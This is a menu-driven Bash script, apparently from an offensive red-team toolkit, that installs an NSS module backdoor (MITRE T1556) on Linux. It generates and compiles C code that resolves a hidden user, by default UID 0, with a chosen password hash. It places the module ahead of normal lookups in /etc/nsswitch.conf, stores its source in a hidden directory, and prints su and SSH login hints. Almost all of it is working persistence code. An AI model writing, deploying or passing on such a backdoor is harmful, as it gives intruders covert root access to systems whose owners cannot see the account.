#!/bin/bash
# T1556 — Modify Authentication Process: NSS Module Backdoor
# Compile and install custom libnss module for backdoor user resolution

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_nss"
NSS_DIR="/usr/lib/.d3m0n_nss"

banner_nss() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1556 — NSS Module Backdoor                 ║"
    echo "  ║   Inject into name resolution — below PAM     ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

install_nss() {
    echo -e "${CYAN}[*] Compiling and installing NSS backdoor module${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"
        return
    fi

    read -p "  Backdoor username [sysupdate]: " BD_USER
    BD_USER="${BD_USER:-sysupdate}"
    read -p "  Backdoor password [d3m0n]: " -s BD_PASS; echo ""
    BD_PASS="${BD_PASS:-d3m0n}"
    read -p "  Backdoor UID [0] (0=root): " BD_UID
    BD_UID="${BD_UID:-0}"
    read -p "  Backdoor home [/root]: " BD_HOME
    BD_HOME="${BD_HOME:-/root}"
    read -p "  Backdoor shell [/bin/bash]: " BD_SHELL
    BD_SHELL="${BD_SHELL:-/bin/bash}"

    mkdir -p "$NSS_DIR" 2>/dev/null
    chmod 700 "$NSS_DIR" 2>/dev/null

    # Generate password hash for shadow entry
    local BD_HASH
    BD_HASH=$(openssl passwd -6 "$BD_PASS" 2>/dev/null)
    [[ -z "$BD_HASH" ]] && BD_HASH=$(python3 -c "import crypt; print(crypt.crypt('${BD_PASS}', crypt.mksalt(crypt.METHOD_SHA512)))" 2>/dev/null)
    [[ -z "$BD_HASH" ]] && { echo -e "${RED}[!] Cannot generate password hash${NC}"; return; }

    # Write C source for NSS module
    cat > "${NSS_DIR}/libnss_d3m0n.c" << CEOF
/* ${MARKER} - NSS Backdoor Module */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <shadow.h>
#include <grp.h>
#include <nss.h>
#include <errno.h>

#define BD_USER "${BD_USER}"
#define BD_UID  ${BD_UID}
#define BD_GID  ${BD_UID}
#define BD_HOME "${BD_HOME}"
#define BD_SHELL "${BD_SHELL}"
#define BD_HASH "${BD_HASH}"
#define BD_GECOS "System Update Service"

/* passwd lookup by name */
enum nss_status _nss_d3m0n_getpwnam_r(const char *name, struct passwd *pwd,
    char *buf, size_t buflen, int *errnop) {
    if (strcmp(name, BD_USER) != 0)
        return NSS_STATUS_NOTFOUND;

    size_t needed = strlen(BD_USER)+1 + strlen(BD_HOME)+1 + strlen(BD_SHELL)+1 + strlen(BD_GECOS)+1 + 2;
    if (buflen < needed) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }

    char *p = buf;
    pwd->pw_name = p; strcpy(p, BD_USER); p += strlen(BD_USER)+1;
    pwd->pw_passwd = p; strcpy(p, "x"); p += 2;
    pwd->pw_uid = BD_UID;
    pwd->pw_gid = BD_GID;
    pwd->pw_gecos = p; strcpy(p, BD_GECOS); p += strlen(BD_GECOS)+1;
    pwd->pw_dir = p; strcpy(p, BD_HOME); p += strlen(BD_HOME)+1;
    pwd->pw_shell = p; strcpy(p, BD_SHELL); p += strlen(BD_SHELL)+1;
    return NSS_STATUS_SUCCESS;
}

/* passwd lookup by uid */
enum nss_status _nss_d3m0n_getpwuid_r(uid_t uid, struct passwd *pwd,
    char *buf, size_t buflen, int *errnop) {
    /* Only respond if this is our UID and the name matches */
    if (uid != BD_UID) return NSS_STATUS_NOTFOUND;
    /* Don't override real root — only respond if explicitly queried by our flow */
    return NSS_STATUS_NOTFOUND;
}

/* shadow lookup */
enum nss_status _nss_d3m0n_getspnam_r(const char *name, struct spwd *spwd,
    char *buf, size_t buflen, int *errnop) {
    if (strcmp(name, BD_USER) != 0)
        return NSS_STATUS_NOTFOUND;

    size_t needed = strlen(BD_USER)+1 + strlen(BD_HASH)+1;
    if (buflen < needed) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }

    char *p = buf;
    spwd->sp_namp = p; strcpy(p, BD_USER); p += strlen(BD_USER)+1;
    spwd->sp_pwdp = p; strcpy(p, BD_HASH); p += strlen(BD_HASH)+1;
    spwd->sp_lstchg = 19000;
    spwd->sp_min = 0;
    spwd->sp_max = 99999;
    spwd->sp_warn = 7;
    spwd->sp_inact = -1;
    spwd->sp_expire = -1;
    spwd->sp_flag = ~0UL;
    return NSS_STATUS_SUCCESS;
}
CEOF

    # Compile
    local LIBDIR
    if [[ -d /lib/x86_64-linux-gnu ]]; then
        LIBDIR="/lib/x86_64-linux-gnu"
    elif [[ -d /lib64 ]]; then
        LIBDIR="/lib64"
    else
        LIBDIR="/lib"
    fi

    gcc -shared -fPIC -o "${LIBDIR}/libnss_d3m0n.so.2" "${NSS_DIR}/libnss_d3m0n.c" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"
        return
    fi

    chmod 644 "${LIBDIR}/libnss_d3m0n.so.2" 2>/dev/null

    # Create symlink
    ln -sf "${LIBDIR}/libnss_d3m0n.so.2" "${LIBDIR}/libnss_d3m0n.so" 2>/dev/null

    # Backup nsswitch.conf
    cp /etc/nsswitch.conf /etc/nsswitch.conf.d3m0n_bak 2>/dev/null

    # Inject into nsswitch.conf — add d3m0n BEFORE compat/files
    sed -i 's/^\(passwd:.*\)files/\1d3m0n files/' /etc/nsswitch.conf 2>/dev/null
    sed -i 's/^\(shadow:.*\)files/\1d3m0n files/' /etc/nsswitch.conf 2>/dev/null

    # If compat is used instead of files
    sed -i 's/^\(passwd:.*\)compat/\1d3m0n compat/' /etc/nsswitch.conf 2>/dev/null
    sed -i 's/^\(shadow:.*\)compat/\1d3m0n compat/' /etc/nsswitch.conf 2>/dev/null

    # Update ldconfig
    ldconfig 2>/dev/null

    echo -e "${GREEN}[+] NSS module installed: ${LIBDIR}/libnss_d3m0n.so.2${NC}"
    echo -e "${GREEN}[+] nsswitch.conf updated${NC}"
    echo -e "${YELLOW}[*] Login: su - ${BD_USER} (password: ${BD_PASS})${NC}"
    echo -e "${YELLOW}[*] SSH: ssh ${BD_USER}@target${NC}"
    echo -e "${YELLOW}[*] User does NOT appear in /etc/passwd — it's resolved via NSS${NC}"
}

nss_status() {
    echo -e "${CYAN}[*] NSS Backdoor Status${NC}"

    local LIBDIR
    for d in /lib/x86_64-linux-gnu /lib64 /lib; do
        [[ -f "${d}/libnss_d3m0n.so.2" ]] && { LIBDIR="$d"; break; }
    done

    if [[ -n "$LIBDIR" ]]; then
        echo -e "  ${GREEN}Module: ${LIBDIR}/libnss_d3m0n.so.2${NC}"
        ls -la "${LIBDIR}/libnss_d3m0n.so"* 2>/dev/null | sed 's/^/  /'
    else
        echo -e "  ${RED}Module not installed${NC}"
        return
    fi

    echo ""
    echo -e "  ${YELLOW}nsswitch.conf:${NC}"
    grep -E "^passwd:|^shadow:" /etc/nsswitch.conf 2>/dev/null | sed 's/^/  /'

    if grep -q "d3m0n" /etc/nsswitch.conf 2>/dev/null; then
        echo -e "  ${GREEN}d3m0n module is ACTIVE in nsswitch.conf${NC}"
    else
        echo -e "  ${RED}d3m0n module NOT in nsswitch.conf${NC}"
    fi

    echo ""
    echo -e "  ${YELLOW}Test resolution:${NC}"
    getent passwd | grep -i "System Update Service" | sed 's/^/  /'
}

nss_cleanup() {
    echo -e "${CYAN}[*] Removing NSS backdoor...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Restore nsswitch.conf
    if [[ -f /etc/nsswitch.conf.d3m0n_bak ]]; then
        cp /etc/nsswitch.conf.d3m0n_bak /etc/nsswitch.conf
        rm -f /etc/nsswitch.conf.d3m0n_bak
        echo -e "${GREEN}  [+] nsswitch.conf restored from backup${NC}"
    else
        sed -i 's/ d3m0n//' /etc/nsswitch.conf 2>/dev/null
        echo -e "${GREEN}  [+] d3m0n removed from nsswitch.conf${NC}"
    fi

    # Remove library
    for d in /lib/x86_64-linux-gnu /lib64 /lib; do
        rm -f "${d}/libnss_d3m0n.so"* 2>/dev/null
    done

    # Remove source
    rm -rf "$NSS_DIR"

    ldconfig 2>/dev/null

    echo -e "${GREEN}[+] NSS backdoor removed${NC}"
}

main() {
    banner_nss

    echo -e "  ${CYAN}[1]${NC} Install NSS backdoor module"
    echo -e "  ${CYAN}[2]${NC} Status check"
    echo -e "  ${CYAN}[3]${NC} Cleanup / remove"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) install_nss ;;
        2) nss_status ;;
        3) nss_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
